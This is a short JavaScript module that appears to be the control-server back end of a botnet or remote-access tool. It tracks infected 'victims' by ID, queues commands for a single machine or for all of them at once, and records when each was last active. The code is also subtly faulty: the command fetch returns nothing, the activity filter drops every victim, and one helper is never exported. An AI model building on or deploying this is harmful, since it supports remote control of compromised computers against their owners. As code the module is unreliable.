let victims = [];

const addVictim = (victimID) => {
  if (!victimID) return;
  let newVictim = { victimID };
  if (!getVictim(victimID))
    victims.push(newVictim);
  declareActive(newVictim);
}

const getVictim = (victimID) => victims.find((v) => v.victimID == victimID);

const addCommand = (command, victim) => {
   if (!isNaN(victim))
     victim = getVictim(victim); // get victim object if number is passed
   victim.commands ? victim.commands.push(command) : (victim.commands = [command]);
 }

const getNextCommand = (victim) => {
  declareActive(victim);
  victim.commands ? victim.commands.pop() : null
};

const getVictimCount = () => victims.length;

const addMassCommand = (command) => victims.map((victim) => addCommand(command, victim));

const getVictimIDs = () => victims.map((v) => v.victimID);

const updateVictimCount = () => victims = victims.filter((victim) => (victim.lastActive -
new Date()) > 6);

const declareActive = (victim) => victim.lastActive = new Date();

module.exports = {
  addVictim,
  getVictim,
  addCommand,
  getNextCommand,
  getVictimCount,
  addMassCommand,
  updateVictimCount
}
